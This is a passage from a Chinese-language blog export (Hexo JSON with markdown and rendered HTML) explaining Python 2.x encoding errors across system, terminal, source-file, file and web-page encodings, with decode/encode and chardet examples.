说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decod()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。\n\n### 源代码编码\n源代码编码指的是python程序本身的编码，默认为ascii。\n\n#### 触发异常点\n　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。\n实例证明：\n```bash\nprint \"中文\"  #中文注释\n```\n报错：SyntaxError: Non-ASCII character '\\xe7'......\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\n```\npython程序开头加上这句代码，指定python源代码编码格式为utf-8。\n\n### 文件编码\n　　文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。\n\n#### 触发异常点（读取文件内容）\n当python程序从文件中获取内容，并输出时，容易触发异常。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\nf=open(\"test.txt\",\"r\")\ncontent=f.read()\nprint type(content)\nprint content\n```\n运行结果：\n```bash\n<type 'str'>\n你好\n```\n　　可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。\n\n#### 解决方案\n在windows下，最好将文件内容转为unicode，可以使用codecs：\n```bash\nf=codecs.open(\"test.txt\", encoding='gbk').read()\n```\n将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(\"\",\"r\").read().decode(\"gbk\")\n\n#### 触发异常点（写入文件内容）\n参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。\n\n#### 解决方案\n参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"  #a为unicode格式编码\nf=open(\"test.txt\",\"w\")\nf.write(a.encode(\"gbk\"))\n```\n当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。\n\n### 网页编码\n　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？\n常见格式：utf-8，gbk，gb2312\n#### 触发异常点\n还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。\n实例证明：\n```bash\n#!coding=utf-8\nimport urllib2\nbody=urllib2.urlopen('http://thief.one').read()\nprint type(body)\nprint body\n```\n运行结果：\n```bash\n<type 'str'>\nbody中文显示乱码\n```\n说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。\n\n#### 解决方案\n　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r''+u\"新成员\"。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。\n\n### 编码判断\n#### 判断字符串编码\n```bash\nisinstance(obj, (str, unicode))\n```\n返回True或者False\n#### 判断网页编码\n```bash\nimport chardet\nimport urllib2\nbody=urllib2.urlopen(\"http://thief.one\").read()\nchardet.detect(body)\n```\n判断编码格式，会有百分比，一般用来判断网页编码比较好。\n\n#### 判断系统编码\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n### python2.x编码建议\n\n* 请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。\n* python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str\n* 在定义变量或者正则时，也定义unicode字符，如a=u\"中文\"；res=r\"\"+u\"正则\"。\n\n### 其他疑难杂症\n实例一：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\nprint a\n```\n变量a的内容本身为unicode编码，怎么正常显示输入？\n解决方案：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\" # unicode转化为中文\nb=a.decode('unicode-escape')\nprint b\n```\n<hr>\n　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。\n　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读[Transcode解决python编码问题](https://github.com/tengzhangchao/Transcode)\n\n*　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）*\n\n<center>*技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！*</center>\n","slug":"解决Python2-x编码之殇","published":1,"updated":"2017-02-16T06:25:29.124Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciz80dyc3001q3ofvnsqbxkt6","content":"<p>　　Python编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块<a href=\"https://github.com/tengzhangchao/Transcode\" target=\"_blank\" rel=\"external\">Transcode</a>，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。<br>　　python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">print</span> sys.getdefaultencoding()    <span class=\"comment\">#系统默认编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.getfilesystemencoding() <span class=\"comment\">#文件系统编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> locale.getdefaultlocale()   <span class=\"comment\">#系统当前编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdin.encoding          <span class=\"comment\">#终端输入编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdout.encoding         <span class=\"comment\">#终端输出编码</span></div></pre></td></tr></table></figure></p>\n<p>将以上这段代码在windows与linux系统下分别运行，查看输出结果。<br>windows终端结果:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ascii</div><div class=\"line\">mbcs</div><div class=\"line\">(<span class=\"string\">'zh_CN'</span>, <span class=\"string\">'cp936'</span>)</div><div class=\"line\">cp936</div><div class=\"line\">cp936</div></pre></td></tr></table></figure></p>\n<p>Linux终端结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ascii</div><div class=\"line\">UTF-8</div><div class=\"line\">(<span class=\"string\">'zh_CN'</span>, <span class=\"string\">'UTF-8'</span>)</div><div class=\"line\">UTF-8</div><div class=\"line\">UTF-8</div></pre></td></tr></table></figure></p>\n<h3 id=\"操作系统编码\"><a href=\"#操作系统编码\" class=\"headerlink\" title=\"操作系统编码\"></a>操作系统编码</h3><p>　　操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？</p>\n<h4 id=\"触发异常点\"><a href=\"#触发异常点\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>　　经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=u<span class=\"string\">\"中文\"</span></div><div class=\"line\">f=open(<span class=\"string\">\"test.txt\"</span>,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">f.write(a)</div></pre></td></tr></table></figure></p>\n<p>报错异常信息：UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 0-1……<br>说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。</p>\n<h4 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>设置系统编码为utf-8或者gbk。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">import sys</div><div class=\"line\">reload(sys)</div><div class=\"line\">sys.setdefaultencoding(<span class=\"string\">'gbk'</span>)</div></pre></td></tr></table></figure></p>\n<p>说明：在windows下将其设置为gbk，在linux在设置为utf-8.</p>\n<h3 id=\"终端编码\"><a href=\"#终端编码\" class=\"headerlink\" title=\"终端编码\"></a>终端编码</h3><p>　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。</p>\n<h4 id=\"乱码点\"><a href=\"#乱码点\" class=\"headerlink\" title=\"乱码点\"></a>乱码点</h4><p>我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">\"中文\"</span>  <span class=\"comment\">#定义一个变量，默认为Str，utf-8编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> a</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(a)</div></pre></td></tr></table></figure></p>\n<p>windows控制台输出结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">浣犲ソ</div><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>linux终端输出结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">中文</div><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。</p>\n<h4 id=\"解决方案-1\"><a href=\"#解决方案-1\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">'你好'</span></div><div class=\"line\">b=a.decode(<span class=\"string\">\"utf-8\"</span>).encode(<span class=\"string\">\"gbk\"</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> b</div></pre></td></tr></table></figure>\n<p>将变量a从utf-8编码转换为gbk编码。</p>\n<h3 id=\"python编码\"><a href=\"#python编码\" class=\"headerlink\" title=\"python编码\"></a>python编码</h3><p>　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。</p>\n<h4 id=\"触发异常点-1\"><a href=\"#触发异常点-1\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">\"中文\"</span>  <span class=\"comment\">#定义一个变量，默认为str，utf-8编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> a</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(a)</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">浣犲ソ</div><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>　　说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u”123”，在双引号前面加上一个u，表示a为unicode编码。</p>\n<h4 id=\"解决方案-2\"><a href=\"#解决方案-2\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">'你好'</span></div><div class=\"line\"><span class=\"built_in\">print</span> a.decode(<span class=\"string\">\"utf-8\"</span>).encode(<span class=\"string\">\"gbk\"</span>)</div></pre></td></tr></table></figure>\n<p>　　说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decod()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。</p>\n<h3 id=\"源代码编码\"><a href=\"#源代码编码\" class=\"headerlink\" title=\"源代码编码\"></a>源代码编码</h3><p>源代码编码指的是python程序本身的编码，默认为ascii。</p>\n<h4 id=\"触发异常点-2\"><a href=\"#触发异常点-2\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"中文\"</span>  <span class=\"comment\">#中文注释</span></div></pre></td></tr></table></figure></p>\n<p>报错：SyntaxError: Non-ASCII character ‘\\xe7’……</p>\n<h4 id=\"解决方案-3\"><a href=\"#解决方案-3\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div></pre></td></tr></table></figure>\n<p>python程序开头加上这句代码，指定python源代码编码格式为utf-8。</p>\n<h3 id=\"文件编码\"><a href=\"#文件编码\" class=\"headerlink\" title=\"文件编码\"></a>文件编码</h3><p>　　文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。</p>\n<h4 id=\"触发异常点（读取文件内容）\"><a href=\"#触发异常点（读取文件内容）\" class=\"headerlink\" title=\"触发异常点（读取文件内容）\"></a>触发异常点（读取文件内容）</h4><p>当python程序从文件中获取内容，并输出时，容易触发异常。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">f=open(<span class=\"string\">\"test.txt\"</span>,<span class=\"string\">\"r\"</span>)</div><div class=\"line\">content=f.read()</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(content)</div><div class=\"line\"><span class=\"built_in\">print</span> content</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div><div class=\"line\">你好</div></pre></td></tr></table></figure></p>\n<p>　　可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。</p>\n<h4 id=\"解决方案-4\"><a href=\"#解决方案-4\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>在windows下，最好将文件内容转为unicode，可以使用codecs：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">f=codecs.open(<span class=\"string\">\"test.txt\"</span>, encoding=<span class=\"string\">'gbk'</span>).read()</div></pre></td></tr></table></figure></p>\n<p>将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(“”,”r”).read().decode(“gbk”)</p>\n<h4 id=\"触发异常点（写入文件内容）\"><a href=\"#触发异常点（写入文件内容）\" class=\"headerlink\" title=\"触发异常点（写入文件内容）\"></a>触发异常点（写入文件内容）</h4><p>参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。</p>\n<h4 id=\"解决方案-5\"><a href=\"#解决方案-5\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=u<span class=\"string\">\"中文\"</span>  <span class=\"comment\">#a为unicode格式编码</span></div><div class=\"line\">f=open(<span class=\"string\">\"test.txt\"</span>,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">f.write(a.encode(<span class=\"string\">\"gbk\"</span>))</div></pre></td></tr></table></figure></p>\n<p>当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。</p>\n<h3 id=\"网页编码\"><a href=\"#网页编码\" class=\"headerlink\" title=\"网页编码\"></a>网页编码</h3><p>　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？<br>常见格式：utf-8，gbk，gb2312</p>\n<h4 id=\"触发异常点-3\"><a href=\"#触发异常点-3\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!coding=utf-8</span></div><div class=\"line\">import urllib2</div><div class=\"line\">body=urllib2.urlopen(<span class=\"string\">'http://thief.one'</span>).read()</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(body)</div><div class=\"line\"><span class=\"built_in\">print</span> body</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div><div class=\"line\">body中文显示乱码</div></pre></td></tr></table></figure></p>\n<p>说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。</p>\n<h4 id=\"解决方案-6\"><a href=\"#解决方案-6\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r’’+u”新成员”。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。</p>\n<h3 id=\"编码判断\"><a href=\"#编码判断\" class=\"headerlink\" title=\"编码判断\"></a>编码判断</h3><h4 id=\"判断字符串编码\"><a href=\"#判断字符串编码\" class=\"headerlink\" title=\"判断字符串编码\"></a>判断字符串编码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">isinstance(obj, (str, unicode))</div></pre></td></tr></table></figure>\n<p>返回True或者False</p>\n<h4 id=\"判断网页编码\"><a href=\"#判断网页编码\" class=\"headerlink\" title=\"判断网页编码\"></a>判断网页编码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">import chardet</div><div class=\"line\">import urllib2</div><div class=\"line\">body=urllib2.urlopen(<span class=\"string\">\"http://thief.one\"</span>).read()</div><div class=\"line\">chardet.detect(body)</div></pre></td></tr></table></figure>\n<p>判断编码格式，会有百分比，一般用来判断网页编码比较好。</p>\n<h4 id=\"判断系统编码\"><a href=\"#判断系统编码\" class=\"headerlink\" title=\"判断系统编码\"></a>判断系统编码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">print</span> sys.getdefaultencoding()    <span class=\"comment\">#系统默认编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.getfilesystemencoding() <span class=\"comment\">#文件系统编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> locale.getdefaultlocale()   <span class=\"comment\">#系统当前编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdin.encoding          <span class=\"comment\">#终端输入编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdout.encoding         <span class=\"comment\">#终端输出编码</span></div></pre></td></tr></table></figure>\n<h3 id=\"python2-x编码建议\"><a href=\"#python2-x编码建议\" class=\"headerlink\" title=\"python2.x编码建议\"></a>python2.x编码建议</h3><ul>\n<li>请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。</li>\n<li>python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str</li>\n<li>在定义变量或者正则时，也定义unicode字符，如a=u”中文”；res=r””+u”正则”。</li>\n</ul>\n<h3 id=\"其他疑难杂症\"><a href=\"#其他疑难杂症\" class=\"headerlink\" title=\"其他疑难杂症\"></a>其他疑难杂症</h3><p>实例一：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">a=<span class=\"string\">\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"</span></div><div class=\"line\"><span class=\"built_in\">print</span> a</div></pre></td></tr></table></figure></p>\n<p>变量a的内容本身为unicode编码，怎么正常显示输入？<br>解决方案：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">a=<span class=\"string\">\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"</span> <span class=\"comment\"># unicode转化为中文</span></div><div class=\"line\">b=a.decode(<span class=\"string\">'unicode-escape'</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> b</div></pre></td></tr></table></figure></p>\n<p><hr><br>　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。<br>　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读<a href=\"https://github.com/tengzhangchao/Transcode\" target=\"_blank\" rel=\"external\">Transcode解决python编码问题</a></p>\n<p><em>　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）</em></p>\n<center><em>技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！</em></center>\n","excerpt":"","more":"<p>　　Python编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块<a href=\"https://github.com/tengzhangchao/Transcode\">Transcode</a>，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。<br>　　python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">print</span> sys.getdefaultencoding()    <span class=\"comment\">#系统默认编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.getfilesystemencoding() <span class=\"comment\">#文件系统编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> locale.getdefaultlocale()   <span class=\"comment\">#系统当前编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdin.encoding          <span class=\"comment\">#终端输入编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdout.encoding         <span class=\"comment\">#终端输出编码</span></div></pre></td></tr></table></figure></p>\n<p>将以上这段代码在windows与linux系统下分别运行，查看输出结果。<br>windows终端结果:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ascii</div><div class=\"line\">mbcs</div><div class=\"line\">(<span class=\"string\">'zh_CN'</span>, <span class=\"string\">'cp936'</span>)</div><div class=\"line\">cp936</div><div class=\"line\">cp936</div></pre></td></tr></table></figure></p>\n<p>Linux终端结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ascii</div><div class=\"line\">UTF-8</div><div class=\"line\">(<span class=\"string\">'zh_CN'</span>, <span class=\"string\">'UTF-8'</span>)</div><div class=\"line\">UTF-8</div><div class=\"line\">UTF-8</div></pre></td></tr></table></figure></p>\n<h3 id=\"操作系统编码\"><a href=\"#操作系统编码\" class=\"headerlink\" title=\"操作系统编码\"></a>操作系统编码</h3><p>　　操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？</p>\n<h4 id=\"触发异常点\"><a href=\"#触发异常点\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>　　经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=u<span class=\"string\">\"中文\"</span></div><div 